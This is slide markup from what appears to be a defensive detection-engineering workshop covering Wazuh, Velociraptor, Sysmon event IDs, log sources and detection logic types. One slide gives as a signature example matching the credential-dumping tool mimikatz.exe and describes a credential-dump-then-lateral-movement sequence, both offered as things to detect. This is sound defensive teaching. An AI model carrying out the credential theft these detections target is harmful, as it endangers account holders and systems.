            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6966550" y="3523794"/>
              <a:ext cx="1853700" cy="1619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7" name="Google Shape;957;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4236950" y="3217426"/>
              <a:ext cx="1851000" cy="1269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8" name="Google Shape;958;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="2928954"/>
              <a:ext cx="18510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9" name="Google Shape;959;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4236950" y="3899475"/>
              <a:ext cx="1851000" cy="1244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960" name="Google Shape;960;p84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Key points</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="961" name="Google Shape;961;p84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PROBLEM WE’RE TACKLING TODAY</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="962" name="Google Shape;962;p84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3224225" y="2370325"/>
            <a:ext cx="5424600" cy="19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Space Grotesk"/>
              <a:buAutoNum type="arabicPeriod"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Ask questions anytime - there are no stupid questions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Space Grotesk"/>
              <a:buAutoNum type="arabicPeriod"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All tools stay in the lab environment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Space Grotesk"/>
              <a:buAutoNum type="arabicPeriod"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Hands-on keyboard - follow along with every demo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Space Grotesk"/>
              <a:buAutoNum type="arabicPeriod"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Break things - that's how we learn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Space Grotesk"/>
              <a:buAutoNum type="arabicPeriod"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Think like an attacker, defend like a champion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63" name="Google Shape;963;p84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GROUND RULES_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="964" name="Google Shape;964;p84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got 8 hour of workshop, so how can we ensure proper communication/fun?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965" name="Google Shape;965;p84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Just some basic stuff to ensure we don’t all sleep-talking while looking at wineventlog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66" name="Google Shape;966;p84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2669427" y="4777621"/>
            <a:ext cx="418200" cy="36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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5659564" y="509050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972" name="Google Shape;972;p85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6992062" y="1941875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973" name="Google Shape;973;p85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5659586" y="1768232"/>
            <a:ext cx="1366200" cy="136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974" name="Google Shape;974;p85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4340079" y="1890803"/>
            <a:ext cx="1366200" cy="13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975" name="Google Shape;975;p85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5659586" y="3080848"/>
            <a:ext cx="1366200" cy="136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976" name="Google Shape;976;p85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ENVIRONMENT OVERVIEW_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="977" name="Google Shape;977;p85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252600" y="1166063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Just a reminder what we working with today…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78" name="Google Shape;978;p85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rPr lang="en"/>
              <a:t>SERVER SIDE:</a:t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79" name="Google Shape;979;p85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="13" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5919225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Wazuh Agent</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="980" name="Google Shape;980;p85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Add tag</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="981" name="Google Shape;981;p85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4599729" y="23631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Event Viewer</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="982" name="Google Shape;982;p85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Windows 11 VM</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="983" name="Google Shape;983;p85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7155100" y="2378650"/>
            <a:ext cx="9435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Velociraptor Agent</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="984" name="Google Shape;984;p85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5919225" y="35769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Sysmon</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="985" name="Google Shape;985;p85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rPr lang="en"/>
              <a:t>Wazuh Manager</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="986" name="Google Shape;986;p85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rPr lang="en"/>
              <a:t>Velociraptor Server</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="987" name="Google Shape;987;p85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rPr lang="en"/>
              <a:t>Digital Forensic</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="988" name="Google Shape;988;p85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Caldera?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="989" name="Google Shape;989;p85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rPr lang="en"/>
              <a:t>Breach Attack Simulation</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="990" name="Google Shape;990;p85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SIEM</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="991" name="Google Shape;991;p85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XDR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6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="242375" y="530828"/>
            <a:ext cx="35766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Not just writing rules…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"If you know the enemy and know yourself, you need not fear the result of a hundred battles." - Sun Tzu</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="997" name="Google Shape;997;p86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="236891" y="203879"/>
            <a:ext cx="64803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Detection Engineering?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="998" name="Google Shape;998;p86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="236900" y="1267500"/>
            <a:ext cx="6948300" cy="245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u="none"/>
              <a:t>Understanding HOW adversaries operate </a:t>
            </a:r>
            <a:endParaRPr u="none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u="none"/>
              <a:t>Mapping capabilities to observables </a:t>
            </a:r>
            <a:endParaRPr u="none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u="none"/>
              <a:t>Creating reliable, low-noise detections </a:t>
            </a:r>
            <a:endParaRPr u="none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u="none"/>
              <a:t>Testing against real attack techniques </a:t>
            </a:r>
            <a:endParaRPr u="none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u="none"/>
              <a:t>Continuous improvement and tuning</a:t>
            </a:r>
            <a:endParaRPr u="none"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="999" name="Google Shape;999;p86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="236900" y="2073203"/>
            <a:ext cx="3576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300"/>
              <a:t>DETECTION ENGINEERING: THE HIDDEN TRICK_</a:t>
            </a:r>
            <a:endParaRPr b="1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7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5900"/>
              <a:t>The Detection Engineering Lifecycle_</a:t>
            </a:r>
            <a:endParaRPr sz="5900"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1005" name="Google Shape;1005;p87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5811225" y="836125"/>
            <a:ext cx="2052000" cy="274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/>
              <a:t>THE DETECTION CYCLE</a:t>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1006" name="Google Shape;1006;p87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5619075" y="1179625"/>
            <a:ext cx="2436300" cy="33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1. THREAT INTELLIGENCE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What are adversaries doing?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↓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2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1000"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1000"/>
              <a:t>CAPABILITY ANALYSIS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What CAN we detect?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↓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3. DETECTION HYPOTHESIS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What SHOULD we detect?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↓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4. RULE DEVELOPMENT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How do we detect it?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↓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5. TESTING &amp; VALIDATION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Does it work?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↓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6. DEPLOYMENT &amp; MONITORING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Is it firing correctly?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↓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7. TUNING &amp; IMPROVEMENT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Back to step 1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88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="237641" y="203879"/>
            <a:ext cx="64803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Detection Pyramid_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1012" name="Google Shape;101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888" y="581929"/>
            <a:ext cx="5550213" cy="4403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7" name="Google Shape;1017;p89"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="0" y="1917000"/>
            <a:ext cx="2846403" cy="3226550"/>
            <a:chOff x="0" y="1917000"/>
            <a:chExt cx="2846403" cy="3226550"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1018" name="Google Shape;1018;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="191700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19" name="Google Shape;1019;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="583203" y="219527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0" name="Google Shape;1020;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="406231" y="2863118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1" name="Google Shape;1021;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="3709850"/>
              <a:ext cx="2263200" cy="1433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2" name="Google Shape;1022;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="406225" y="3904091"/>
              <a:ext cx="2263200" cy="123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1023" name="Google Shape;1023;p89"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3039975" y="1917000"/>
            <a:ext cx="6103900" cy="3226630"/>
            <a:chOff x="3039975" y="1917000"/>
            <a:chExt cx="6103900" cy="3226630"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1024" name="Google Shape;1024;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="1917000"/>
              <a:ext cx="61038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5" name="Google Shape;1025;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="3949323"/>
              <a:ext cx="1851000" cy="119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6" name="Google Shape;1026;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5802775" y="1917000"/>
              <a:ext cx="3341100" cy="286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7" name="Google Shape;1027;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5730500" y="2475475"/>
              <a:ext cx="2187000" cy="1661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8" name="Google Shape;1028;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5730500" y="3793330"/>
              <a:ext cx="2219100" cy="135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9" name="Google Shape;1029;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6966550" y="3523794"/>
              <a:ext cx="1853700" cy="1619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0" name="Google Shape;1030;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4236950" y="3217426"/>
              <a:ext cx="1851000" cy="1269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1" name="Google Shape;1031;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="2928954"/>
              <a:ext cx="18510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2" name="Google Shape;1032;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4236950" y="3899475"/>
              <a:ext cx="1851000" cy="1244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033" name="Google Shape;1033;p89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Network</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1034" name="Google Shape;1034;p89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Application</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1035" name="Google Shape;1035;p89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Endpoint</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1036" name="Google Shape;1036;p89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✓ Firewall Logs (Connections, Blocks)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✓ DNS Queries (C2 domains, DGA)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✓ Proxy/Web Logs (Downloads, Malicious URLs)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37" name="Google Shape;1037;p89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DATA SOURCE_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1038" name="Google Shape;1038;p89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252600" y="2783532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✓ Sysmon (Process, Network, Registry, File)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✓ Security Event Log (Logon, Account changes)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✓ PowerShell Logs (Script Block, Transcription)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/>
              <a:t>✓ Windows Defender (Detections, Scans)</a:t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39" name="Google Shape;1039;p89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WHAT LOGS MATTER FOR DETECTION?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40" name="Google Shape;1040;p89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✓ Application Logs (Errors, Exceptions)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✓ Database Audit Logs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41" name="Google Shape;1041;p89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2669427" y="4777621"/>
            <a:ext cx="418200" cy="36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90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600000" y="2237350"/>
            <a:ext cx="3392400" cy="2653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47" name="Google Shape;1047;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7195198" y="2990100"/>
            <a:ext cx="1696200" cy="190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48" name="Google Shape;1048;p90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3721600" y="2449750"/>
            <a:ext cx="3067200" cy="23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KEY EVENT IDs YOU'LL USE TODAY: </a:t>
            </a:r>
            <a:endParaRPr/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Event ID 1: Process Creation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Event ID 3: Network Connection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Event ID 7: Image/DLL Loaded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Event ID 10: Process Access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Event ID 11: File Creation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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>vent ID 13: Registry Value Set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Event ID 22: DNS Query </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1049" name="Google Shape;1049;p90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GOLDEN RULE: If Sysmon sees it, you can detect it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050" name="Google Shape;1050;p90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FACT</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1051" name="Google Shape;1051;p90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SYSMON: SYSTEM MONITOR_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1052" name="Google Shape;1052;p90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3598725" y="1485850"/>
            <a:ext cx="37194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/>
              <a:t>The Swiss Army Knife of Endpoint Logging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53" name="Google Shape;1053;p90" title="sysmon1-e1555000664943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163" r="20163" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="2546700" cy="3583199"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1054" name="Google Shape;1054;p90" title="sysmon1-e1555000664943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-2389" l="2675" r="44439" t="2390"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280475" y="474638"/>
            <a:ext cx="2940900" cy="46688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91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4054825" y="1287525"/>
            <a:ext cx="2991000" cy="125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60" name="Google Shape;1060;p91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4971175" y="1318225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>
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ANOMALY-BASED </a:t>
            </a:r>
            <a:endParaRPr sz="900"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>
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"Alert if you see something UNUSUAL" </a:t>
            </a:r>
            <a:endParaRPr sz="900"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>
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example: 100 processes in 10 seconds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061" name="Google Shape;1061;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4711625" y="2498463"/>
            <a:ext cx="2991000" cy="1254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62" name="Google Shape;1062;p91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5653400" y="2554388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/>
              <a:t>BEHAVIOR-BASED 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/>
              <a:t>"Alert if you see THIS sequence" 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/>
              <a:t>Example: Credential dump → Lateral movement</a:t>
            </a:r>
            <a:endParaRPr sz="900"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1063" name="Google Shape;1063;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1778050" y="2816775"/>
            <a:ext cx="2991000" cy="12546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64" name="Google Shape;1064;p91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2719825" y="2928263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/>
              <a:t>PATTERN-BASED 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/>
              <a:t>"Alert if you see THIS pattern" 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/>
              <a:t>Example: Process + Network + Registry change</a:t>
            </a:r>
            <a:endParaRPr sz="900"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1065" name="Google Shape;1065;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="743550" y="4886747"/>
            <a:ext cx="2991000" cy="2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66" name="Google Shape;1066;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8400300" y="2671550"/>
            <a:ext cx="743700" cy="125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67" name="Google Shape;1067;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8147700" y="0"/>
            <a:ext cx="996300" cy="125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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1068" name="Google Shape;1068;p91"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4415310" y="1648236"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1069" name="Google Shape;1069;p91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0" name="Google Shape;1070;p91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1" name="Google Shape;1071;p91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2" name="Google Shape;1072;p91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3" name="Google Shape;1073;p9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4" name="Google Shape;1074;p9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5" name="Google Shape;1075;p9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6" name="Google Shape;1076;p9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7" name="Google Shape;1077;p9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8" name="Google Shape;1078;p9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9" name="Google Shape;1079;p9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080" name="Google Shape;1080;p91"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5076126" y="2899448"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1081" name="Google Shape;1081;p91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82" name="Google Shape;1082;p91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83" name="Google Shape;1083;p91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84" name="Google Shape;1084;p91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85" name="Google Shape;1085;p9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86" name="Google Shape;1086;p9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87" name="Google Shape;1087;p9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88" name="Google Shape;1088;p9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89" name="Google Shape;1089;p9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90" name="Google Shape;1090;p9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91" name="Google Shape;1091;p9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092" name="Google Shape;1092;p91"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2141185" y="3219420"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1093" name="Google Shape;1093;p91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94" name="Google Shape;1094;p91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95" name="Google Shape;1095;p91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96" name="Google Shape;1096;p91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97" name="Google Shape;1097;p9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98" name="Google Shape;1098;p9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99" name="Google Shape;1099;p9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00" name="Google Shape;1100;p9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01" name="Google Shape;1101;p9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02" name="Google Shape;1102;p9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03" name="Google Shape;1103;p9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104" name="Google Shape;1104;p91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252600" y="1318225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HOW DO WE WRITE DETECTIONS?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05" name="Google Shape;1105;p91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DETECTION LOGIC TYPE_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1106" name="Google Shape;1106;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1145220" y="1593690"/>
            <a:ext cx="2991000" cy="12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07" name="Google Shape;1107;p91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2081670" y="1724555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/>
              <a:t>SIGNATURE-BASED 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/>
              <a:t>"Alert if you see exactly THIS" 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900"/>
              <a:t>Example: mimikatz.exe process name</a:t>
            </a:r>
            <a:endParaRPr sz="900"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1108" name="Google Shape;1108;p91"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1454147" y="1977173"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1109" name="Google Shape;1109;p91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0" name="Google Shape;1110;p91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1" name="Google Shape;1111;p91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2" name="Google Shape;1112;p91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3" name="Google Shape;1113;p9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4" name="Google Shape;1114;p9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5" name="Google Shape;1115;p9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6" name="Google Shape;1116;p9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7" name="Google Shape;1117;p9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8" name="Google Shape;1118;p9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9" name="Google Shape;1119;p9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92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="242375" y="530828"/>
            <a:ext cx="35766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GOAL: Signal, not noise</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1125" name="Google Shape;1125;p92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="236891" y="203879"/>
            <a:ext cx="64803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100"/>
              <a:t>Good vs Bad Detections_</a:t>
            </a:r>
            <a:endParaRPr sz="2100"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1126" name="Google Shape;1126;p92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="236900" y="1613650"/>
            <a:ext cx="6948300" cy="245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GOOD: 					BAD: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✓ Low false positives 		✗ Fires on normal activity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✓ Clear actionable output 	✗ Vague, unclear alerts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✓ Covers real attack TTPs 	✗ Theoretical scenarios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✓ Tested and validated 		✗ Never tested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✓ Well documented 		✗ No context</a:t>
            </a:r>
            <a:endParaRPr u="none"/>
          </a:p>
        </p:txBody>
      </p:sp>
